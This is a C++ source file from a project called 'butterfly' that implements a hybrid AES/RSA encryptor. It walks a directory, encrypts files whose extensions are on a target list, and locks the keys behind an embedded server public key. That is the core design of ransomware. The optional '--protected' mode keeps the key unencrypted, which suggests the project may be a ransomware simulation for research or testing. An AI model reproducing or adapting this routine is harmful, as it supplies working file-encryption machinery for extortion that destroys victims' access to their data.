
#include "crypto/encryptor.h"

namespace butterfly
{

namespace hybrid
{

Encryptor::Encryptor(int keySize) : _keySize(keySize), _aesKeyInit(false),
                                    _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
                                    _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                    _aesEncryptor(new aes::AESEncryptor())
{
    LOG_TRACE("Create class Encryptor");
}

void Encryptor::validateAESKeyLength()
{
    std::string aeskey, aesiv, aeskeypair;
    do
    {

        if ( _aesKeyInit )
        {
            sleep(1);
            _aesEncryptor->generateAESKeyWithSalt();
        }

        aeskey = _aesEncryptor->getAESKey();
        aesiv = _aesEncryptor->getAESIv();
        aeskeypair = _aesEncryptor->getAESKeyPair();
        LOG_TRACE("Generated AESKey: " << aeskey << " with Length: " << aeskey.length() << " and AESIV: " <<  aesiv << " with Length: " << aesiv.length() << " and AESKeyPairLength: " << aeskeypair.length());
        _aesKeyInit = true;

    }
    while ( (aeskey.length() < 32) or (aesiv.length() < 16));

}

void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
{
    // 32 Bytes AESKey + 16 Bytes IV
    if ( !butterfly::writeBinFile(butterfly::UNENC_AESKEY_FILENAME, aesKeyPair.c_str(), static_cast<long>(aesKeyPair.length())) )
    {
        LOG_ERROR("Could not save the unencrypted AESKeyPair File to Filesystem!");
        std::cerr << "Could not save the unencrypted AESKeyPair File to Filesystem!" << std::endl;
    }

}

void Encryptor::invokeDir(const std::string &dirPath, bool protection)
{
    // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
    encryptCPrivateRSA();

    // Get all files from provided directory path
    auto files =  DirectoryIterator::getAllFiles(dirPath);

    if ( !aes::AESEncryptor::initDone() )
    {
        // Generate and validate the AES Key and IV
        validateAESKeyLength();
    }

    // Get the AESKeyPair(AESKey + AESIV)
    std::string aeskeypair = _aesEncryptor->getAESKeyPair();

    // If --protected is enabled
    if (protection)
    {
        //LOG_TRACE("Length of AESKEY: " << aeskey.length() << " and length of AESIV: " << aesiv.length());
        saveUnencryptedAESKeyPair(aeskeypair);
    }

    // Iterate over all file paths
    for (auto &file: files)
    {
        // Check if the provided file extension is part of the fileExtensionVector
        if ( std::find(butterfly::fileExtensionVec.begin(), butterfly::fileExtensionVec.end(), DirectoryIterator::getFileExtension(file)) != butterfly::fileExtensionVec.end() )
        {

            // Compare file size with the MAX FILE SIZE
            if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE )
            {
                LOG_TRACE("Spawn a new encryption thread for file: " << file.string());
                spawnThread(file.string());
            } else
            {
                encryptFileWithAES(file.string());
            }

        }

    }

    // Join all threads which were spawned for huge file encryption
    joinThreads();

    // Save the final AESKey.bin file
    encryptFinalAESKeyWithRSA(aeskeypair, butterfly::ENC_AESKEY_FILENAME);

}

void Encryptor::encryptCPrivateRSA()
{
    // Get the CPrivateRSA.pem file string
    std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
    EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();

    try
    {
        // Encrypt the CPrivateRSA.pem file string
        int encMSGLen = _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
        //int encMSGLen = _rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr);
        // Get the encrypted CPrivateRSA.pem string
        std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
        // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
        _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);

    } catch (RSAEncryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        throw EncryptorException("Error on encrypting the CPrivateRSA File! RSAEncryptionException: " + std::string(e.what())); // If error occured here, it makes no sense to continue
    }

}

void Encryptor::encryptFileWithAES(const std::string &filepath)
{

    try
    {
        // Encrypt the file with AES
        _aesEncryptor->encryptFile(filepath);

    } catch (AESEncryptionException &e)
    {
        std::cerr << e.what() << std::endl;
    }

}

void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair, const std::string &filename)
{

    try
    {
        // Encrypt the AES Key String
        int encMSGLen = _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyPair, butterfly::RSAKEY_TYPE::AESKEY);
        //int encMSGLen = _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr);
        // Get the encrypted AES Key String
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
        // Save the encrypted AES Key to AESKey.bin
        _rsaEncryptorAESKey->writeEncMSGToFile(filename, aesKeyEnc, encMSGLen);

    } catch (RSAEncryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        // If error occured here, save AESKeyPair unencrypted to ensure that files can be decrypted manually
        saveUnencryptedAESKeyPair(aesKeyPair);
    }

}

void Encryptor::spawnThread(const std::string &filepath)
{
    // Create new instance for each huge file
    std::unique_ptr<aes::AESEncryptor> aesEncInstance = std::unique_ptr<aes::AESEncryptor>(new aes::AESEncryptor());
    // Create dedicated thread for this encryption file
    std::thread t(&aes::AESEncryptor::encryptFile, *aesEncInstance, filepath);
    // Save thread in thread vector
    _threads.push_back(std::move(t));
}

void Encryptor::joinThreads()
{
    for (auto &t: _threads)
    {
        if (t.joinable())
            t.join();
    }
}

} // namespace hybrid

} // namespace butterfly
